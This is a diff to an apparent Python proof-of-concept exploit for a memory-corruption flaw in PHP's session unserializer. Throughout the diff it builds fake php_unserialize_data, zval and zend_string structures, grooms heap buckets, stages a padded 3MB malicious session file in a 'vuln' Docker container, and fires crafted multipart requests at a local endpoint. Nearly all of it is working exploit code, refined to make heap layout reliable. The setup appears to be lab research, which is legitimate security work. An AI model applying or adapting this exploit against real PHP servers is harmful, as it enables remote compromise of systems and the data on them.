@@ -42,12 +42,20 @@ def file_part(name, value, filename=b"a.txt"):
 
 def groom(gaddr, fake_str_addr, fake_str_data, ridx_slot):
     """Fake php_unserialize_data at gaddr; slot ridx_slot -> fake zval at
-    +0x400 -> fake zend_string at fake_str_addr with fake_str_data."""
+    +0x400 -> fake zend_string at fake_str_addr with fake_str_data.
+    last_dtor/first_dtor point at a PRE-BUILT fake var_dtor_entries at
+    +0x800 (used_slots=0, 255-slot capacity) so tmp_var takes the
+    existing-entries path: ZERO fresh allocations during the decode
+    (a NULL last_dtor made tmp_var emalloc a fresh 4096B dtor chunk
+    that best-fit onto d's freed pages and aliased the header)."""
     b = bytearray(8192)
     struct.pack_into("<Q", b, 0x00, gaddr + 0x38)     # last = &entries
-    struct.pack_into("<Q", b, 0x08, 0)                # first_dtor
-    struct.pack_into("<Q", b, 0x10, 0)                # last_dtor
-    struct.pack_into("<Q", b, 0x30, 0x1000)           # max_depth
+    struct.pack_into("<Q", b, 0x08, gaddr + 0x800)   # first_dtor = fake dtor
+    struct.pack_into("<Q", b, 0x10, gaddr + 0x800)   # last_dtor  = fake dtor
+    struct.pack_into("<Q", b, 0x30, 0x1000)         # max_depth
+    # fake var_dtor_entries @ +0x800: used_slots=0, next=NULL, data[255]
+    struct.pack_into("<Q", b, 0x800, 0)              # used_slots
+    struct.pack_into("<Q", b, 0x808, 0)              # next
     # entries (embedded) @ 0x38: used_slots, next, data[]
     struct.pack_into("<Q", b, 0x38, 14)               # used_slots = 14
     struct.pack_into("<Q", b, 0x40, 0)                # next
@@ -83,12 +91,12 @@ def build_body(gsid, gaddr, sess_token, filedata=b"z" * 4096):
     # so the FILE_START tree bins and ps_read's page-needs draw from
     # bucket[1] and NEVER split d's 3-page run (bucket[3] head).
     decoys = b"".join(part(b"s%d" % i, b"S" * 4000) for i in range(8))
-    # ORDER: small parts FIRST (stock bucket[1] with free 1-page runs),
-    # GROOM LAST (its buf1 takes d from bucket[3]; freed intact with our
-    # bytes), then the file part (its small allocs draw bucket[1], d safe)
+    # 3MB-session variant: ps_read's zend_string becomes a HUGE mmap
+    # (threshold ~= 2MB), so it can NEVER land at d+0 and clobber the
+    # fake-d header. Minimal part set; groom's 2-page intermediate takes
+    # d (best-fit smallest run), writes our header at d+0, then moves.
     body = (part(b"PHPSESSID", gsid.encode()) +
             part(b"PHP_SESSION_UPLOAD_PROGRESS", b"poc") +
-            decoys +
             part(b"g", g) +
             file_part(b"f", filedata) +
             b"--" + BND + b"--\r\n")
@@ -116,10 +124,17 @@ def fire(body):
 
 
 def stage(sid, content):
-    t64 = base64.b64encode(content).decode()
-    q.docker_exec(q.CT["vuln"],
-                  f"F=/tmp/sess_{sid}; rm -f $F; echo {t64} | base64 -d > $F; "
-                  f"chown nobody:nobody $F; chmod 600 $F")
+    if len(content) < 100000:
+        t64 = base64.b64encode(content).decode()
+        q.docker_exec(q.CT["vuln"],
+                      f"F=/tmp/sess_{sid}; rm -f $F; echo {t64} | base64 -d > $F; "
+                      f"chown nobody:nobody $F; chmod 600 $F")
+    else:
+        import subprocess
+        subprocess.run(["docker", "exec", "-i", q.CT["vuln"], "sh", "-c",
+                        f"cat > /tmp/sess_{sid} && chown nobody:nobody /tmp/sess_{sid} "
+                        f"&& chmod 600 /tmp/sess_{sid}"],
+                       input=content, check=True, timeout=60)
 
 
 def main():
@@ -151,7 +166,9 @@ def main():
             break
     print(f"remnant d = 0x{d_addr:x}")
     gsid = f"orc{int(time.time())}"
-    stage(gsid, b'k|a:2:{i:0;s:9:"WALKOK1!";i:1;R:3;}')
+    # >2MB session => ps_read string is an mmap, never at d. Padding has
+    # no '|' so the pipe-format decoder stops after our key cleanly.
+    stage(gsid, b'k|a:2:{i:0;s:9:"WALKOK1!";i:1;R:3;}pad|s:' + str(3*1024*1024).encode()             + b':"' + b'A' * (3*1024*1024) + b'";')
     body = build_body(gsid, d_addr, None)
     first = fire(body)
     print(f"consumer: {first}")
@@ -164,3 +181,24 @@ def main():
 
 if __name__ == "__main__":
     sys.exit(main())
+
+
+def fire_main(body):
+    import socket
+    s2 = socket.create_connection(("127.0.0.1", 8151), timeout=25)
+    s2.sendall((f"POST /ping.php HTTP/1.1\r\nHost: x\r\n"
+                f"Content-Type: multipart/form-data; boundary=G\r\n"
+                f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
+                ).encode() + body)
+    buf = b""
+    s2.settimeout(25)
+    while True:
+        try:
+            d = s2.recv(65536)
+        except socket.timeout:
+            break
+        if not d:
+            break
+        buf += d
+    s2.close()
+    return buf.split(b"\r\n", 1)[0].decode(errors="replace") if buf else "(reset)"
